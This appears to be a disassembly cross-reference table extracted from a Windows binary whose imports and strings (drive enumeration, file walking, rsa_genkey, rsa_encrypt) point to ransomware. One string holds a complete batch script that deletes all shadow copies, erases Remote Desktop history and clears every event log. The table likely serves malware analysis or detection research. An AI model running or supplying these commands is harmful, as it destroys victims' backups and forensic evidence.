reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x41244f	0x414090	import	0x4123cc	KERNEL32.dll.lstrlenW
0x41245c	0x418bb4	string	0x4123cc	CertificatesCheck
0x412465	0x414020	import	0x4123cc	ADVAPI32.dll.RegSetValueExW
0x41246f	0x414000	import	0x4123cc	ADVAPI32.dll.RegCloseKey
0x412486	0x418ca0	string	0x412480	EXDATA
0x412495	0x414054	import	0x412480	KERNEL32.dll.FindResourceW
0x41249d	0x41407c	import	0x412480	KERNEL32.dll.SizeofResource
0x4124a8	0x41252c	string	0x412480	SUVWR
0x4124b1	0x412e21	string	0x412480	QSUVWj
0x4124db	0x4140e0	import	0x412480	KERNEL32.dll.HeapCreate
0x4124eb	0x4140ec	import	0x412480	KERNEL32.dll.HeapAlloc
0x412538	0x414054	import	0x41252c	KERNEL32.dll.FindResourceW
0x412542	0x414058	import	0x41252c	KERNEL32.dll.LoadResource
0x41254c	0x41407c	import	0x41252c	KERNEL32.dll.SizeofResource
0x412555	0x4140a4	import	0x41252c	KERNEL32.dll.LockResource
0x412563	0x414070	import	0x41252c	KERNEL32.dll.GetProcessHeap
0x41256a	0x4140ec	import	0x41252c	KERNEL32.dll.HeapAlloc
0x412582	0x41404c	import	0x41252c	KERNEL32.dll.FreeResource
0x4125a2	0x414070	import	0x41258f	KERNEL32.dll.GetProcessHeap
0x4125a9	0x4140ec	import	0x41258f	KERNEL32.dll.HeapAlloc
0x4125b1	0x414068	import	0x41258f	KERNEL32.dll.GetLogicalDrives
0x4125e4	0x414074	import	0x41258f	KERNEL32.dll.GetDriveTypeA
0x412602	0x414070	import	0x41258f	KERNEL32.dll.GetProcessHeap
0x412609	0x4140ec	import	0x41258f	KERNEL32.dll.HeapAlloc
0x412618	0x4140c4	import	0x41258f	KERNEL32.dll.lstrcpyA
0x412631	0x414098	import	0x41258f	KERNEL32.dll.lstrcmpiA
0x41266b	0x412abc	string	0x412650	UVW3
0x412676	0x412abc	string	0x412650	UVW3
0x412681	0x4133dc	string	0x412650	SVWj\bj
0x412691	0x412859	string	0x412650	_^][
0x412697	0x4140ac	import	0x412650	KERNEL32.dll.lstrcatW
0x41269d	0x4140a8	import	0x412650	KERNEL32.dll.lstrcmpiW
0x4126bb	0x414090	import	0x412650	KERNEL32.dll.lstrlenW
0x4126e3	0x414044	import	0x412650	KERNEL32.dll.FindFirstFileW
0x41273b	0x412d07	string	0x412650	QUVW3
0x41274d	0x412b40	string	0x412650	QQSU3ۉL$\fVW blocks=Basic Latin,Arabic
0x412774	0x4133dc	string	0x412650	SVWj\bj
0x41277f	0x412b40	string	0x412650	QQSU3ۉL$\fVW blocks=Basic Latin,Arabic
0x4127b0	0x4140bc	import	0x412650	KERNEL32.dll.SetFileAttributesW
0x4127bb	0x412b40	string	0x412650	QQSU3ۉL$\fVW blocks=Basic Latin,Arabic
0x4127e1	0x4140c0	import	0x412650	KERNEL32.dll.lstrcpyW
0x412807	0x414060	import	0x412650	KERNEL32.dll.MoveFileExW
0x41281c	0x414070	import	0x412650	KERNEL32.dll.GetProcessHeap
0x412823	0x414064	import	0x412650	KERNEL32.dll.HeapFree
0x412833	0x4140b0	import	0x412650	KERNEL32.dll.FindNextFileW
0x412842	0x41409c	import	0x412650	KERNEL32.dll.FindClose
0x412869	0x4141ac	import	0x412864	SHLWAPI.dll.PathRemoveFileSpecW
0x4128a6	0x41402c	import	0x412864	KERNEL32.dll.CreateFileW
0x4128d0	0x4140c8	import	0x412864	KERNEL32.dll.WriteFile
0x4128d7	0x4140d4	import	0x412864	KERNEL32.dll.CloseHandle
0x4128e2	0x414084	import	0x4128e1	KERNEL32.dll.GetFileAttributesW
0x412911	0x414040	import	0x4128f3	KERNEL32.dll.GetTempFileNameW
0x41291b	0x418aac	string	0x4128f3	.bat
0x41293c	0x41402c	import	0x4128f3	KERNEL32.dll.CreateFileW
0x41294f	0x414090	import	0x4128f3	KERNEL32.dll.lstrlenW
0x41296b	0x418af4	string	0x4128f3	" goto Repeat\r\ndel "
0x412974	0x418ad8	string	0x4128f3	"\r\nif exist "
0x412986	0x418ab8	string	0x4128f3	:Repeat\r\ndel "
0x41299c	0x4140a0	import	0x4128f3	KERNEL32.dll.LocalAlloc
0x4129b7	0x418ad8	string	0x4128f3	"\r\nif exist "
0x4129c9	0x418af4	string	0x4128f3	" goto Repeat\r\ndel "
0x4129fc	0x412d07	string	0x4128f3	QUVW3
0x412a03	0x4140c8	import	0x4128f3	KERNEL32.dll.WriteFile
0x412a0a	0x4140b8	import	0x4128f3	KERNEL32.dll.LocalFree
0x412a11	0x4140d4	import	0x4128f3	KERNEL32.dll.CloseHandle
0x412a44	0x418aa0	string	0x412a2b	__tmp
0x412a4e	0x414040	import	0x412a2b	KERNEL32.dll.GetTempFileNameW
0x412a5a	0x418aac	string	0x412a2b	.bat
0x412a7d	0x41402c	import	0x412a2b	KERNEL32.dll.CreateFileW
0x412a8e	0x4188e0	string	0x412a2b	@echo off\r\nvssadmin.exe Delete Shadows /All /Quiet\r\nreg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f\r\nreg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f\r\nreg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"\r\ncd %userprofile%\documents\\r\nattrib Default.rdp -s -h\r\ndel Default.rdp \r\nfor /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
0x412a95	0x4140d0	import	0x412a2b	KERNEL32.dll.lstrlenA
0x412a9e	0x4140c8	import	0x412a2b	KERNEL32.dll.WriteFile
0x412aa5	0x4140d4	import	0x412a2b	KERNEL32.dll.CloseHandle
0x412acb	0x41408c	import	0x412abc	KERNEL32.dll.MultiByteToWideChar
0x412ada	0x414070	import	0x412abc	KERNEL32.dll.GetProcessHeap
0x412ae1	0x4140ec	import	0x412abc	KERNEL32.dll.HeapAlloc
0x412af2	0x41408c	import	0x412abc	KERNEL32.dll.MultiByteToWideChar
0x412b34	0x41405c	import	0x412afe	KERNEL32.dll.CreateProcessW
0x412ba3	0x4140d0	import	0x412b40	KERNEL32.dll.lstrlenA
0x412bae	0x4140d0	import	0x412b40	KERNEL32.dll.lstrlenA
0x412bbc	0x4140d0	import	0x412b40	KERNEL32.dll.lstrlenA
0x412bcc	0x4140d0	import	0x412b40	KERNEL32.dll.lstrlenA
0x412bd5	0x414098	import	0x412b40	KERNEL32.dll.lstrcmpiA
0x412bf9	0x4140d0	import	0x412b40	KERNEL32.dll.lstrlenA
0x412c05	0x4140d0	import	0x412b40	KERNEL32.dll.lstrlenA
0x412c13	0x4140d0	import	0x412b40	KERNEL32.dll.lstrlenA
0x412c23	0x4140d0	import	0x412b40	KERNEL32.dll.lstrlenA
0x412c2c	0x414098	import	0x412b40	KERNEL32.dll.lstrcmpiA
0x412d1e	0x414078	import	0x412d07	KERNEL32.dll.WideCharToMultiByte
0x412d28	0x414070	import	0x412d07	KERNEL32.dll.GetProcessHeap
0x412d2f	0x4140ec	import	0x412d07	KERNEL32.dll.HeapAlloc
0x412d45	0x414078	import	0x412d07	KERNEL32.dll.WideCharToMultiByte
0x412e33	0x4140e0	import	0x412e21	KERNEL32.dll.HeapCreate
0x412e44	0x4140ec	import	0x412e21	KERNEL32.dll.HeapAlloc
0x412e57	0x412db2	string	0x412e21	QSUVW
0x412e92	0x414070	import	0x412e84	KERNEL32.dll.GetProcessHeap
0x412e99	0x4140ec	import	0x412e84	KERNEL32.dll.HeapAlloc
0x412f14	0x41402c	import	0x412efd	KERNEL32.dll.CreateFileW
0x412f38	0x4140d4	import	0x412efd	KERNEL32.dll.CloseHandle
0x412fb9	0x4140c8	import	0x412f44	KERNEL32.dll.WriteFile
0x41302c	0x418ccc	string	0x412fd8	rsa_genkey
0x41304e	0x414070	import	0x412fd8	KERNEL32.dll.GetProcessHeap
0x413088	0x412efd	string	0x412fd8	SVW3\v
0x4130c6	0x4140ec	import	0x412fd8	KERNEL32.dll.HeapAlloc
0x413107	0x4140ec	import	0x412fd8	KERNEL32.dll.HeapAlloc
0x41313c	0x4140ec	import	0x412fd8	KERNEL32.dll.HeapAlloc
0x4131d6	0x414070	import	0x412fd8	KERNEL32.dll.GetProcessHeap
0x4131e0	0x414064	import	0x412fd8	KERNEL32.dll.HeapFree
0x413224	0x412e84	string	0x412fd8	SUVW
0x41328b	0x418cc0	string	0x413232	rsa_encrypt
0x4132c3	0x418614	string	0x413232	010001
0x413373	0x414090	import	0x41336e	KERNEL32.dll.lstrlenW
0x413383	0x414070	import	0x41336e	KERNEL32.dll.GetProcessHeap
0x41338a	0x4140ec	import	0x41336e	KERNEL32.dll.HeapAlloc
0x413394	0x4140c0	import	0x41336e	KERNEL32.dll.lstrcpyW
0x4133b3	0x4140c0	import	0x41339f	KERNEL32.dll.lstrcpyW
0x4133bd	0x414070	import	0x41339f	KERNEL32.dll.GetProcessHeap
0x4133c4	0x414064	import	0x41339f	KERNEL32.dll.HeapFree
0x4133cd	0x414070	import	0x41339f	KERNEL32.dll.GetProcessHeap
0x4133d4	0x414064	import	0x41339f	KERNEL32.dll.HeapFree
0x4133e7	0x414070	import	0x4133dc	KERNEL32.dll.GetProcessHeap
0x4133ee	0x4140ec	import	0x4133dc	KERNEL32.dll.HeapAlloc
0x41356b	0x41357b	string	0x4134e0	+D$\f\eT$
0x413571	0x41357b	string	0x4134e0	+D$\f\eT$
